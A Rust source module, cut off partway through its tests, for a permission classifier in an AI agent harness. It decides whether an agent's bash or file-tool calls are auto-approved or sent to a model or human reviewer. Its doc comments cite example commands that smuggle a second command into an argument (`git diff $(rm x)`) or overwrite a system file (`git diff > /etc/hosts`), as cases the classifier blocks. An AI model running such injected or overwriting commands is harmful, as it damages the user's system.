//! The permission fast-path — the deterministic, zero-model-cost rung of the cascade
//! (backlog/permissions/prefix-fastpath.md, backlog/permissions/README.md).
//!
//! [`classify`] is a **pure function** of `(role, tool call)` returning a [`Verdict`]:
//! `Clear` (auto-approve, no human, no model) or `Gate` (fall through to the spotter
//! rung, then the human gate). The classifier is the *mechanism*; the role config is the
//! *policy* — there are no special-cased program names or directories in here.
//!
//! ## Why this rung is sound despite being incomplete
//!
//! The threat model is **error, not deception** (backlog/permissions/README.md): a
//! well-intentioned session reaching for the wrong tool, not an adversary obfuscating
//! bash. So the fast-path only needs to *accept what it is certain about* and pass
//! everything else down. It classifies **structural simplicity** (decidable) rather than
//! **behavior** (not), and it errs toward `Gate`: any doubt — a parse failure, an
//! operator, an expansion, an unmatched prefix — gates.
//!
//! ## Bash: the two-stage check (the order matters)
//!
//! Stage 1 (structural simplicity) runs *before* stage 2 (prefix match), so a trusted
//! `git diff` prefix can never clear `git diff > /etc/hosts` or `git diff $(rm x)` —
//! those die in stage 1, before any prefix is consulted.
//!
//! - **Stage 1** parses the command with [`yash_syntax`] (a real POSIX parser, not a
//!   regex) and accepts only a *single simple command* — no operators (`| & ; && ||`),
//!   no *file* redirection, no command/arithmetic substitution, no parameter/tilde expansion,
//!   no env-assignment prefix, no unquoted glob/brace. The one redirection it tolerates is a
//!   pure file-descriptor duplication/closure (`2>&1`, `>&2`, `2>&-`) — it rewires the process's
//!   own fds and touches no filesystem, so it's sound and lets the habitual `cmd 2>&1` stay on the
//!   fast path ([`is_safe_fd_dup`]). yash is POSIX-strict, which only
//!   costs *coverage* (a few bash-only forms gate to the spotter), never *soundness* —
//!   bash's dangerous operators are POSIX too, so they parse as operators and gate;
//!   bash-only syntax either fails to parse (→ gate) or surfaces as inert literal words
//!   we still filter. yash parses (does not expand), so `git diff HEAD~1` is fine — we
//!   do the expansion-metacharacter filtering ourselves.
//! - **Stage 2** matches the lexed `[program, args…]` against the role's
//!   `(program, safe-arg-prefix)` allowlist (token-wise prefix; empty prefix = blanket).
//!
//! ## Structured tools
//!
//! A structured tool clears only if its name is in the role's `tool` grants **and**, for
//! the path-bearing ones, its target resolves under a `path` grant carrying the needed
//! permission (reads need `read`, writes need `write`; `write` implies `read`). Nothing
//! clears unless the config says so — an empty role gates everything, exactly as before.
//!
//! Mapping a tool to "which input field holds the path, and is it a read or a write"
//! requires reaching into each built-in's JSON input by known key ([`path_check`]). That
//! is a deliberate wart: there is no way around it until an MCP-superset can carry
//! permission metadata alongside the tool schema. The string literals are centralized in
//! [`path_check`] so the coupling is in one place. One subtlety it encodes: `undo_edit`
//! writes to disk but carries *no* path (the target was named by an earlier
//! `edit`), so write permission is enforced at `edit` — the only
//! edit-pipeline call that names the file — and `undo_edit` clears on the name grant.

use std::collections::{BTreeMap, HashMap};
use std::path::{Component, Path, PathBuf};

use serde_json::Value;

use crate::bash;
use crate::config::{Config, Perms};
use crate::log::{ConfigChange, LogEntry, Origin, Payload, Stance, ToolCall};

/// The fast-path's decision for one tool call. Binary; the extension point for the
/// spotter rung, which splits `Gate` into a graded `{clear, watch, gate}` stance
/// (docs/permissions.md, [`crate::spotter`]).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Verdict {
    /// Certain-enough to auto-approve: no human, no model round-trip.
    Clear,
    /// Not cleared — fall through to the spotter rung, then the human gate.
    Gate,
}

/// The operator's **review level** (docs/permissions.md): who reviews a
/// call the deterministic fast-path didn't clear. An ordinal dial of increasing human involvement,
/// runtime-settable over the control channel (unlike the frozen base config). Orthogonal to pace —
/// any combination is meaningful (autonomous-but-slow, human-only-and-held). Pause is *not* a
/// position here; that's the `held` overlay.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ReviewLevel {
    /// No synchronous human: a spotter `Watch`/`Gate` redirects the model to its config
    /// (`agent::autonomous_gate_message`) instead of blocking on an absent gate.
    Autonomous,
    /// The supervised default: fast-path → spotter → human gate.
    SpotterHuman,
    /// The human takes the spotter's role **entirely** — skip the spotter (pay no tokens, log no
    /// `Spot`); every call the fast-path didn't clear goes straight to the human, who both gates it
    /// and grows the allowlist by hand (the `approve-always-at-prefix` grant).
    HumanOnly,
}

impl ReviewLevel {
    /// Ordinal for lock-free `AtomicU8` storage; also the gear position a UI can present.
    pub fn as_u8(self) -> u8 {
        match self {
            ReviewLevel::Autonomous => 0,
            ReviewLevel::SpotterHuman => 1,
            ReviewLevel::HumanOnly => 2,
        }
    }

    /// Inverse of [`as_u8`](Self::as_u8); any out-of-range value falls back to the supervised
    /// default (fail-safe: an unknown ordinal never silently drops to autonomous).
    pub fn from_u8(n: u8) -> Self {
        match n {
            0 => ReviewLevel::Autonomous,
            2 => ReviewLevel::HumanOnly,
            _ => ReviewLevel::SpotterHuman,
        }
    }

    /// The wire / CLI token (snake_case), for `GET /state`, `POST /review-level`, and `efference
    /// review-level`.
    pub fn as_str(self) -> &'static str {
        match self {
            ReviewLevel::Autonomous => "autonomous",
            ReviewLevel::SpotterHuman => "spotter_human",
            ReviewLevel::HumanOnly => "human_only",
        }
    }

    /// Parse the wire / CLI token; `None` if unrecognized (the caller reports a 400 / usage error
    /// rather than guessing).
    pub fn parse(s: &str) -> Option<Self> {
        match s {
            "autonomous" => Some(ReviewLevel::Autonomous),
            "spotter_human" => Some(ReviewLevel::SpotterHuman),
            "human_only" => Some(ReviewLevel::HumanOnly),
            _ => None,
        }
    }
}

/// A filesystem permission a path-bearing tool needs to clear.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Perm {
    Read,
    Write,
}

/// Fold the log's [`Payload::ConfigEdit`] changes onto a base config, yielding the **effective
/// config** the classifier should consult (backlog/permissions/config-edit.md). The effective
/// policy at any point is `base + fold(changes)` — the same fold-over-the-log shape as the wire: this
/// is materializing a table from an ordered log, exactly as a database replays its write-ahead
/// log (kin to `project(log)`, docs/log-and-projection.md). The base config is the table's initial state;
/// each change is a `set key = value` the replay applies in order.
///
/// Each change is **replace-at-key** (last-write-wins). Today's changes happen to be additive
/// (membership in a set, a perm on a path), so the fold is also idempotent — replaying a change
/// already persisted to the file *and* still in the log lands the same value. But order now
/// matters in general (the table is materialized by replaying in sequence), where the previous
/// list-append fold was order-independent. This batch form rebuilds from the whole log (used at
/// startup to fold a resumed log, and in tests); the daemon then maintains its effective config
/// **incrementally** via [`apply_config_change`], so a gate never re-scans the log.
pub fn effective_config(base: &Config, log: &[LogEntry]) -> Config {
    let mut role = base.clone();
    for entry in log {
        // Only a committed edit takes effect; a `Proposed`/`Cancelled` entry is audit-only and
        // inert in the effective config (backlog/permissions/proposal-lifecycle.md).
        if let Payload::ConfigEdit(edit) = &entry.payload
            && edit.state == crate::log::EditState::Committed
        {
            apply_config_change(&mut role, &edit.change);
        }
    }
    role
}

/// Apply one [`ConfigChange`] to a config in place — the per-change step of [`effective_config`],
/// exposed so the daemon can update its effective config *incrementally* (applying each change as
/// it appends) rather than re-scanning the whole log on every gate (docs/control-channel.md).
/// Replace-at-key: each variant sets the addressed key in the matching set/map.
pub fn apply_config_change(role: &mut Config, change: &ConfigChange) {
    match change {
        ConfigChange::Command { command } => {
            role.commands.insert(command.clone());
        }
        ConfigChange::Path { path, read, write } => {
            role.paths.insert(
                path.clone(),
                Perms {
                    read: *read,
                    write: *write,
                },
            );
        }
        ConfigChange::Tool { name } => {
            role.tools.insert(name.clone());
        }
        ConfigChange::Scope { text } => {
            role.scope = Some(text.clone());
        }
    }
}

/// How many sightings of a command-prefix before a prefix-promotion probe rides along — the
/// frequency gate (backlog/permissions/prefix-promotion.md). `2` = probe on the *second* time we see
/// the prefix; "we don't propose promoting a shape we've seen only once." Tuneable — the decay curve
/// sets the real value.
pub const MIN_SIGHTINGS_TO_PROBE: u32 = 2;

/// How many independent safe-votes promote a prefix — the consensus threshold `K`. `1` = the first
/// `clear_always` files a proposal for an orchestrator to confirm. Raising it (and tolerating a few
/// dissenting not-safe votes) is the path to evidence-only, human-out-of-the-loop promotion; the
/// vote ledger already records the evidence, so it's a threshold change, not a schema one.
pub const PROMOTE_AFTER_SAFE_VOTES: u32 = 1;

/// The per-prefix tally the prefix-promotion descent reads (backlog/permissions/prefix-promotion.md).
/// Derived state, like the effective config: folded from the log's `Spot` entries at startup
/// ([`probe_ledger`]) and maintained incrementally by the daemon as the loop runs. Never on the wire.
#[derive(Clone, Debug, Default)]
pub struct ProbeLedger {
    /// prefix (joined tokens, e.g. `"git log"`) → how many spotter-assessed bash commands had it as
    /// a token-prefix. The recurrence signal the frequency gate reads.
    seen: BTreeMap<String, u32>,
    /// prefix → (safe votes, not-safe votes). A safe vote is a `clear_always` stance on a call that
    /// probed this prefix; not-safe is any other stance there. The promotion evidence base.
    votes: BTreeMap<String, (u32, u32)>,
}

impl ProbeLedger {
    /// Count one spotter-assessed bash command: bump `seen` for every token-prefix of it. Called
    /// once per assessed command — incrementally in the loop, and replayed by [`probe_ledger`] on
    /// resume — so the two agree (exactly one `Spot` per assessed command).
    pub fn observe(&mut self, tokens: &[String]) {
        for len in 1..=tokens.len() {
            *self.seen.entry(tokens[..len].join(" ")).or_default() += 1;
        }
    }

    /// Record a probe vote for `prefix`: `safe` iff the stance was `clear_always`.
    pub fn vote(&mut self, prefix: &str, safe: bool) {
        let entry = self.votes.entry(prefix.to_string()).or_default();
        if safe {
            entry.0 += 1;
        } else {
            entry.1 += 1;
        }
    }

    /// Whether `prefix` is **resolved** and so must not be re-probed. At today's `K = 1` a single
    /// vote resolves it (one safe → promoted/pending; one not-safe → declined). When `K` grows this
    /// becomes "≥ K safe, or any not-safe (dissent breaks consensus)".
    fn resolved(&self, prefix: &str) -> bool {
        self.votes
            .get(prefix)
            .is_some_and(|(safe, not_safe)| *safe >= PROMOTE_AFTER_SAFE_VOTES || *not_safe > 0)
    }

    /// Whether `prefix`'s safe-votes have reached the promotion threshold `K` — the loop's signal to
    /// file a `Proposed(Command)` for it.
    pub fn ready_to_promote(&self, prefix: &str) -> bool {
        self.votes
            .get(prefix)
            .is_some_and(|(safe, _)| *safe >= PROMOTE_AFTER_SAFE_VOTES)
    }

    /// The prefix to probe on the current bash command, or `None`. The descent
    /// (backlog/permissions/prefix-promotion.md): the **shortest** token-prefix of `tokens` that is
    /// promotable (lexes + not already covered by `[commands]`), seen at least
    /// [`MIN_SIGHTINGS_TO_PROBE`] times, and not yet [`resolved`]. Shortest-first, so the broadest
    /// (most valuable) promotion is tried before descending to a sub-verb; the descent self-terminates
    /// at the first safe prefix because promoting it stops its subtree from reaching the spotter.
    ///
    /// [`resolved`]: ProbeLedger::resolved
    pub fn next_probe(&self, role: &Config, tokens: &[String]) -> Option<String> {
        (1..=tokens.len())
            .map(|len| tokens[..len].join(" "))
            .find(|prefix| {
                promotable_command(role, prefix).is_some() // not already covered by the allowlist
                    && self.seen.get(prefix).copied().unwrap_or(0) >= MIN_SIGHTINGS_TO_PROBE
                    && !self.resolved(prefix)
            })
    }
}

/// Fold the probe ledger from a whole log (startup / resume) — the batch form of the incremental
/// updates the daemon makes as the loop runs (backlog/permissions/prefix-promotion.md). Mirrors
/// [`effective_config`]. Seen-counts come from each `Spot`'s bash command (recovered by `call_id`);
/// votes from each `Spot` that probed a prefix, counted only when the verdict was the model's — a
/// fail-closed `Fallback` didn't actually judge, so it casts no vote.
pub fn probe_ledger(log: &[LogEntry]) -> ProbeLedger {
    // call_id → the bash command it ran, so a `Spot` can recover the command it judged.
    let mut command_of: HashMap<&crate::log::CallId, &str> = HashMap::new();
    for entry in log {
        if let Payload::Assistant { calls, .. } = &entry.payload {
            for call in calls {
                if call.name == bash::NAME
                    && let Some(cmd) = call.input.get("command").and_then(Value::as_str)
                {
                    command_of.insert(&call.id, cmd);
                }
            }
        }
    }
    let mut ledger = ProbeLedger::default();
    for entry in log {
        let Payload::Spot(spot) = &entry.payload else {
            continue;
        };
        if let Some(cmd) = command_of.get(&spot.call_id)
            && let Some(tokens) = simple_command_tokens(cmd)
        {
            ledger.observe(&tokens);
        }
        if let Some(prefix) = &spot.probed_prefix
            && spot.origin == Origin::Model
        {
            ledger.vote(prefix, spot.stance == Stance::ClearAlways);
        }
    }
    ledger
}

/// Classify a tool call against the role (backlog/permissions/prefix-fastpath.md).
/// `bash` runs the two-stage check; a structured tool clears on its `tool` grant plus any
/// `path` grant its target needs. Resolves grants against the process cwd (session-stable,
/// the fixed root the built-in tools also resolve relative paths against).
pub fn classify(role: &Config, call: &ToolCall) -> Verdict {
    let cwd = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("/"));
    classify_in(role, call, &cwd)
}

/// Whether `call` is a write whose target resolves (lexically, against the process cwd) to
/// `protected` — the session's own config file. A write to the policy file is a **proposal** that
/// must always reach the operator, so the loop forces the human gate on it, **bypassing both the
/// fast-path and the spotter** — neither may auto-clear a permission change
/// (backlog/permissions/session-dir-and-config-as-reviewed-file.md). This is the one named-meta-file
/// exception to "no deny carve-out inside an allowed subtree": `.` may grant the tree, but this file
/// still gates.
///
/// Only the write-class tools that *name* a path qualify (`write`→`path`, `edit`→`file_path`).
/// `undo_edit` carries no path, but it can only revert a previously-`edit`ed target — and
/// an `edit` of the config is caught here — so the review point is the naming step, exactly
/// where write permission is already enforced (the acknowledged per-tool wart in `path_check`).
pub fn is_config_write(call: &ToolCall, protected: &Path) -> bool {
    let cwd = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("/"));
    is_config_write_in(call, protected, &cwd)
}

/// The cwd-injected core of [`is_config_write`], for deterministic tests.
fn is_config_write_in(call: &ToolCall, protected: &Path, cwd: &Path) -> bool {
    let key = match call.name.as_str() {
        "write" => "path",
        "edit" => "file_path",
        _ => return false,
    };
    let Some(target) = call.input.get(key).and_then(Value::as_str) else {
        return false;
    };
    let Some(protected) = protected.to_str() else {
        return false;
    };
    lexical_normalize(&absolutize(target, cwd)) == lexical_normalize(&absolutize(protected, cwd))
}

/// The cwd-injected core, for deterministic tests. `bash` ignores `cwd`.
fn classify_in(role: &Config, call: &ToolCall, cwd: &Path) -> Verdict {
    if call.name == bash::NAME {
        match call.input.get("command").and_then(Value::as_str) {
            Some(command) => classify_bash(role, command),
            // A bash call without a string `command` is malformed — let the gate see it.
            None => Verdict::Gate,
        }
    } else {
        classify_structured(role, call, cwd)
    }
}

/// A structured (non-bash) tool clears when every path it targets is granted — by **either**
/// clearance source, decided **per path**: a `[paths]` grant (which requires the tool name to be in
/// `tools`) *or* a `[context]` listing (a standalone grant needing no name — docs/context.md). The
/// union is per-path on purpose: a batched `read` mixing a `[paths]`-covered file and a
/// `[context]`-covered one clears, because each path is authorized by *some* source, even though
/// neither source covers the whole batch alone (the dogfood regression). A path-less tool
/// (`kill_process`, …) clears on the name grant; `undo_edit` also clears on any `[context]` write
/// grant. Anything not granted gates.
fn classify_structured(role: &Config, call: &ToolCall, cwd: &Path) -> Verdict {
    // `undo_edit` names no path (its target was named by the `edit` where write is enforced — the
    // acknowledged wart in [`path_spec`]). It clears on the name grant, or on any `[context]` write
    // grant, mirroring its clear-on-name rule under `tools`.
    if call.name == "undo_edit" {
        let cleared = role.tools.contains(&call.name)
            || role
                .context
                .iter()
                .any(|e| e.grants.update || e.grants.create);
        return verdict(cleared);
    }
    let Some((key, perm, default)) = path_spec(&call.name) else {
        // A structured tool with no path target (`kill_process`, `retarget_edit`, `consolidate`,
        // the supervisor/inbox tools): the name grant alone suffices.
        return verdict(role.tools.contains(&call.name));
    };
    let Some(targets) = input_targets(&call.input, key, default) else {
        return Verdict::Gate; // required path missing/empty/malformed → never auto-clear
    };
    // Per-path union of the two sources. `[context]` clears standalone; `[paths]` clears only when
    // the tool name is also granted (the name grant is a per-call precondition on that source).
    let name_granted = role.tools.contains(&call.name);
    let cleared = targets.iter().all(|t| {
        context_granted(role, t, perm, cwd) || (name_granted && path_granted(role, t, perm, cwd))
    });
    verdict(cleared)
}

/// The per-tool path rule — the acknowledged wart (see the module docs): which JSON input key holds
/// the target path, whether it is a read or a write, and the fallback when the key is absent (the
/// optional-path tools default to cwd `"."`; `None` means the path is required). Tools absent from
/// this map (`undo_edit`, `retarget_edit`, `consolidate`, the supervisor/inbox tools) carry no path
/// and clear on the name grant alone. The string literals are centralized here so the coupling to
/// each built-in's schema lives in one place, shared by both clearance sources.
fn path_spec(name: &str) -> Option<(&'static str, Perm, Option<&'static str>)> {
    Some(match name {
        // Reads: the target must be under a read-or-write grant.
        "read" => ("paths", Perm::Read, None),
        "list" => ("path", Perm::Read, Some(".")),
        "search" => ("path", Perm::Read, Some(".")),
        "find_anchor" => ("file_path", Perm::Read, None),
        // Writes: the target must be under a write grant. `edit` is where the edit pipeline names
        // its file, so write is enforced here; `undo_edit` (no path) clears on the name grant.
        "write" => ("path", Perm::Write, None),
        "edit" => ("file_path", Perm::Write, None),
        _ => return None,
    })
}

/// Tiny helper: fold a boolean clearance decision into a [`Verdict`].
fn verdict(cleared: bool) -> Verdict {
    if cleared {
        Verdict::Clear
    } else {
        Verdict::Gate
    }
}

/// Extract the path target(s) at `input[key]`: a single string or a non-empty array of
/// strings (every element must be a string). `default` supplies a fallback when the key is
/// absent (the optional-path tools default to cwd `"."`); `None` means the path is required.
/// Returns `None` for a missing required key, an empty array, or any non-string value —
/// a malformed call never clears.
fn input_targets<'a>(
    input: &'a Value,
    key: &str,
    default: Option<&'a str>,
) -> Option<Vec<&'a str>> {
    match input.get(key) {
        Some(Value::String(s)) => Some(vec![s.as_str()]),
        Some(Value::Array(items)) => {
            if items.is_empty() {
                return None;
            }
            items.iter().map(Value::as_str).collect()
        }
        Some(_) => None, // present but not a string/array → malformed
        None => default.map(|d| vec![d]),
    }
}

/// Whether `target` falls under some `[context]` entry path carrying `perm`
/// (docs/context.md). Read is always on for a listed path — a file exactly, a
/// location's whole subtree — by the same lexical rule as [`path_granted`]. A write needs the
/// covering entry's `update` (target exists) or `create` (target is new) grant; the existence
/// probe is the one filesystem touch in the classifier — it is what tells create from update,
/// and is harmless here because a verdict is derived state, never on the wire
/// (docs/log-and-projection.md). `exec` entries have no files and grant nothing.
fn context_granted(role: &Config, target: &str, perm: Perm, cwd: &Path) -> bool {
    let target = lexical_normalize(&absolutize(target, cwd));
    role.context.iter().any(|entry| {
        let crate::config::ContextSource::Files(paths) = &entry.source else {
            return false;
        };
        paths
            .iter()
            .any(|p| target.starts_with(lexical_normalize(&absolutize(p, cwd))))
            && match perm {
                Perm::Read => true,
                Perm::Write => {
                    (entry.grants.update && target.exists())
                        || (entry.grants.create && !target.exists())
                }
            }
    })
}

/// Whether `path` (resolved against `cwd`) is granted `perm` by the role's `[paths]` map.
/// `write` implies `read`. Resolution is **longest-prefix-wins**: among the grants whose
/// subtree contains the target, the *most specific* (deepest) one governs — so a nested
/// grant carves an exclusion out of a broader parent (allow `.`, deny `.efference/`,
/// re-allow `.efference/<id>/config.toml` read-only). A no-access grant (`false` sugar,
/// `Perms::default()`) is a real deny once it's the governing prefix. The harness injects
/// its self-surface layers (docs/permissions.md) *after* the operator's config, so an
/// exact-key operator grant is overwritten and a safety deny wins at equal specificity;
/// an operator can still override by naming a *strictly deeper* path. Path matching is
/// lexical (`..`/`.` collapsed without touching the filesystem), so a symlink inside a
/// grant that points outside is treated as inside — acceptable under the error-not-deception
/// threat model (backlog/permissions/README.md).
fn path_granted(role: &Config, path: &str, perm: Perm, cwd: &Path) -> bool {
    let target = lexical_normalize(&absolutize(path, cwd));
    let governing = role
        .paths
        .iter()
        .filter_map(|(grant_path, perms)| {
            let grant = lexical_normalize(&absolutize(grant_path, cwd));
            target
                .starts_with(&grant)
                .then_some((grant.components().count(), perms))
        })
        .max_by_key(|(depth, _)| *depth);
    match governing {
        Some((_, perms)) => match perm {
            Perm::Read => perms.read || perms.write, // write implies read
            Perm::Write => perms.write,
        },
        None => false, // no grant covers the target at all
    }
}

/// Make `path` absolute by joining it onto `cwd` if it is relative.
fn absolutize(path: &str, cwd: &Path) -> PathBuf {
    let p = Path::new(path);
    if p.is_absolute() {
        p.to_path_buf()
    } else {
        cwd.join(p)
    }
}

/// Lexically collapse `.` and `..` without touching the filesystem (so it works for
/// not-yet-existing write targets). `..` pops a trailing normal component but never
/// escapes past the root/prefix.
fn lexical_normalize(path: &Path) -> PathBuf {
    let mut out = PathBuf::new();
    for component in path.components() {
        match component {
            Component::Prefix(_) | Component::RootDir | Component::Normal(_) => {
                out.push(component.as_os_str())
            }
            Component::CurDir => {}
            Component::ParentDir => {
                // Only pop a real directory name; `..` at/above the root is a no-op.
                if matches!(out.components().next_back(), Some(Component::Normal(_))) {
                    out.pop();
                }
            }
        }
    }
    out
}

/// Stage 1 + stage 2 for a bash command string. `Clear` only if it is structurally
/// simple *and* its program/args match an allowlist entry.
fn classify_bash(role: &Config, command: &str) -> Verdict {
    let Some(tokens) = simple_command_tokens(command) else {
        return Verdict::Gate; // stage 1 rejected (complex, expanded, or unparseable)
    };
    // Stage 2: token-wise prefix match against the command-prefix set. Each key is re-lexed with
    // the *same* lexer as the command, so `"git diff"` compares as `["git", "diff"]`, not by
    // string — and a key that fails to lex (can't happen post-validation) is simply skipped.
    // Re-lexing a handful of keys is free next to parsing the command itself.
    if role.commands.iter().any(|key| {
        simple_command_tokens(key).is_some_and(|key_tokens| tokens.starts_with(&key_tokens))
    }) {
        Verdict::Clear
    } else {
        Verdict::Gate
    }
}

/// Validate a spotter-proposed command prefix for **promotion** into the `[commands]` allowlist
/// (backlog/permissions/prefix-fastpath.md, spotter.md). The spotter, fresh-context, judges a
/// program-prefix *standing-safe* (reversible/in-scope regardless of args) and suggests adding it;
/// this is the soundness gate before that suggestion becomes a `Proposed(Command)`:
///
/// - It must **lex to a simple-command token vector** with the fast-path's own lexer — the same
///   requirement config-load enforces on `[commands]` keys, so the stored key and any command it's
///   matched against agree token-for-token. A prefix that doesn't lex (`"git | rm"`, an expansion)
///   is rejected, never queued. This is what holds the **program-prefix-granularity** invariant
///   (safety is discontinuous in the command string, so only program-prefixes are soundly
///   memoizable, never exact commands).
/// - It must not be **already covered** by an existing key — if some current key's tokens are a
///   prefix of the proposed prefix's tokens, any command it would clear already clears, so the
///   promotion is redundant and dropped (keeps the proposal queue free of no-ops; the spotter is
///   blind to the allowlist, so it can't dedup itself).
///
/// Returns the normalized key (the trimmed prefix) to store, or `None` if it fails either check.
pub fn promotable_command(role: &Config, prefix: &str) -> Option<String> {
    let tokens = simple_command_tokens(prefix)?;
    let already_covered = role.commands.iter().any(|key| {
        simple_command_tokens(key).is_some_and(|key_tokens| tokens.starts_with(&key_tokens))
    });
    if already_covered {
        return None;
    }
    Some(prefix.trim().to_string())
}

/// Whether a redirection is a pure file-descriptor **duplication or closure** (`2>&1`, `>&2`,
/// `2>&-`, `<&3`) — the one redirection class stage 1 tolerates. Sound because it never names or
/// touches a file: `>&`/`<&` (yash's [`RedirOp::FdOut`]/[`RedirOp::FdIn`]) only copy or close an
/// already-open descriptor, so there is no filesystem write, read, or exfiltration to gate on.
///
/// The operand must reduce (via [`literal_word`]) to a descriptor: an all-digits fd number or `-`
/// (close). A `>&` whose operand is a filename (`>& out.log`) or an expansion (`2>&$FD`) is *not* a
/// pure dup — it can reach the filesystem — so it returns `false` and the command gates. Here-docs
/// and here-strings are file/data redirections and are rejected here too.
///
/// [`RedirOp::FdOut`]: yash_syntax::syntax::RedirOp::FdOut
/// [`RedirOp::FdIn`]: yash_syntax::syntax::RedirOp::FdIn
fn is_safe_fd_dup(redir: &yash_syntax::syntax::Redir) -> bool {
    use yash_syntax::syntax::{RedirBody, RedirOp};
    let RedirBody::Normal { operator, operand } = &redir.body else {
        return false; // here-doc: data redirection, not an fd dup
    };
    if !matches!(operator, RedirOp::FdOut | RedirOp::FdIn) {
        return false; // a file redirection (`>`, `>>`, `<`, `<>`, `>|`, here-string)
    }
    match literal_word(operand) {
        // `-` closes the fd; otherwise the operand must be a bare descriptor number.
        Some(word) => word == "-" || (!word.is_empty() && word.bytes().all(|b| b.is_ascii_digit())),
        None => false, // expanded/globbed operand → not a decidable fd
    }
}

/// **Stage 1 — structural simplicity.** Parse `command` and return its literal token
/// vector (`[program, args…]`) iff it is exactly one simple command with no operators,
/// redirections, assignments, or expansions, and whose every word is wholly literal.
/// `None` for anything else (including a parse error) — the caller gates it.
///
/// `pub(crate)` because config-load reuses it to validate `[commands]` keys (the soundness
/// requirement that a key lexes to the same token vector the command is checked against).
pub(crate) fn simple_command_tokens(command: &str) -> Option<Vec<String>> {
    use yash_syntax::syntax::{Command, List};

    let list: List = command.parse().ok()?;
    // Exactly one item (no `;`-separated list), not backgrounded (`&`).
    let [item] = list.0.as_slice() else {
        return None;
    };
    if item.async_flag.is_some() {
        return None;
    }
    let and_or = &item.and_or;
    if !and_or.rest.is_empty() {
        return None; // no `&&` / `||`
    }
    let pipeline = &and_or.first;
    if pipeline.negation {
        return None; // no leading `!`
    }
    let [command] = pipeline.commands.as_slice() else {
        return None; // no `|` — exactly one command
    };
    let Command::Simple(simple) = &**command else {
        return None; // not a compound command / function definition
    };
    if !simple.assigns.is_empty() {
        return None; // no `FOO=bar cmd` env-assignment prefix
    }
    // Redirections gate — *except* a file-descriptor duplication/closure (`2>&1`, `>&2`, `2>&-`,
    // `<&3`), which touches no filesystem: it only rewires the process's own descriptors among
    // already-open fds. That's sound under the error-not-deception model, and it's the habitual
    // `cmd 2>&1` the model appends; without this a trailing `2>&1` knocks a blanket-allowlisted
    // program off the fast path (docs/permissions.md). A file redirection, here-doc, or expanded
    // operand still gates via [`is_safe_fd_dup`].
    if !simple.redirs.iter().all(is_safe_fd_dup) {
        return None;
    }
    let mut tokens = Vec::with_capacity(simple.words.len());
    // `words` pairs each word with its expansion mode; we only need the word.
    for (word, _mode) in &simple.words {
        tokens.push(literal_word(word)?);
    }
    // Defensive: a simple command with no words shouldn't reach here, but never return
    // an empty token vector (the caller assumes a program word exists).
    if tokens.is_empty() {
        return None;
    }
    Some(tokens)
}

/// Reduce a [`Word`] to its literal string, or `None` if any unit would be **expanded**
/// or **globbed** by bash at runtime. yash parses without expanding, so we inspect the
/// units ourselves:
///
/// - single-quoted text is literal (a `|` or `*` inside `'…'` is just text — this is why
///   a regex would be wrong and a real lexer is needed);
/// - double-quoted text is literal only if it contains no `$…`/`` `…` `` expansion;
/// - unquoted literal chars are fine *except* the glob/brace metacharacters `* ? [ {`
///   (bash globs them anywhere) and a leading `~` (bash tilde-expands only at word
///   start, so `HEAD~1` is fine but `~/x` is not);
/// - anything else (unquoted parameter/command substitution, a tilde unit, `$'…'`) →
///   `None`.
///
/// [`Word`]: yash_syntax::syntax::Word
fn literal_word(word: &yash_syntax::syntax::Word) -> Option<String> {
    use yash_syntax::syntax::{TextUnit, WordUnit};

    let mut out = String::new();
    for (index, unit) in word.units.iter().enumerate() {
        match unit {
            WordUnit::SingleQuote(text) => out.push_str(text),
            WordUnit::DoubleQuote(text) => {
                for tu in &text.0 {
                    match tu {
                        TextUnit::Literal(c) | TextUnit::Backslashed(c) => out.push(*c),
                        _ => return None, // $param / $(...) / `...` / $((...)) inside "…"
                    }
                }
            }
            WordUnit::Unquoted(TextUnit::Literal(c)) => {
                if matches!(c, '*' | '?' | '[' | '{') {
                    return None; // unquoted glob / brace-expansion metacharacter
                }
                if *c == '~' && index == 0 {
                    return None; // leading unquoted tilde → tilde expansion
                }
                out.push(*c);
            }
            WordUnit::Unquoted(TextUnit::Backslashed(c)) => out.push(*c), // escaped literal
            _ => return None, // unquoted expansion, tilde unit, $'…', etc.
        }
    }
    Some(out)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::log::CallId;

    /// The review-level dial (docs/permissions.md) round-trips through its
    /// `u8` ordinal (atomic storage) and its wire token (`/state`, `/review-level`, CLI), and both
    /// decoders fail *safe* — an unknown ordinal / token never silently becomes `Autonomous`.
    #[test]
    fn review_level_round_trips_and_fails_safe() {
        for level in [
            ReviewLevel::Autonomous,
            ReviewLevel::SpotterHuman,
            ReviewLevel::HumanOnly,
        ] {
            assert_eq!(ReviewLevel::from_u8(level.as_u8()), level, "u8 round-trip");
            assert_eq!(
                ReviewLevel::parse(level.as_str()),
                Some(level),
                "token round-trip"
            );
        }
        // Ordinal is the gear order: Autonomous < SpotterHuman < HumanOnly.
        assert!(
            ReviewLevel::Autonomous.as_u8() < ReviewLevel::SpotterHuman.as_u8()
                && ReviewLevel::SpotterHuman.as_u8() < ReviewLevel::HumanOnly.as_u8()
        );
        // Fail-safe: an out-of-range ordinal or unknown token defaults to supervised, never
        // silently to the unsupervised `Autonomous`.
        assert_eq!(ReviewLevel::from_u8(99), ReviewLevel::SpotterHuman);
        assert_eq!(ReviewLevel::parse("nonsense"), None);
    }

    /// Build a [`Config`] whose `commands` set holds the given command-prefix keys.
    fn commands(keys: &[&str]) -> std::collections::BTreeSet<String> {
        keys.iter().map(|s| s.to_string()).collect()
    }

    /// A config whose command-allowlist mirrors the curation rule: blanket for whole-arg-space-
    /// recoverable programs (`cargo`, `rg`), sub-verb for the irreversible frontier
    /// (`git diff`/`status`, never `git push`).
    fn sample_role() -> Config {
        Config {
            commands: commands(&["cargo", "rg", "git diff", "git status"]),
            ..Default::default()
        }
    }

    fn bash_call(command: &str) -> ToolCall {
        ToolCall {
            id: CallId("toolu_x".into()),
            name: bash::NAME.into(),
            input: serde_json::json!({ "command": command }),
        }
    }

    fn verdict(command: &str) -> Verdict {
        classify(&sample_role(), &bash_call(command))
    }

    // --- Stage 1: structural simplicity (decided before any prefix match) ---

    #[test]
    fn simple_commands_lex_to_their_tokens() {
        assert_eq!(
            simple_command_tokens("cargo test --workspace"),
            Some(vec!["cargo".into(), "test".into(), "--workspace".into()])
        );
        // yash parses, does not expand: `HEAD~1`'s non-leading `~` is literal.
        assert_eq!(
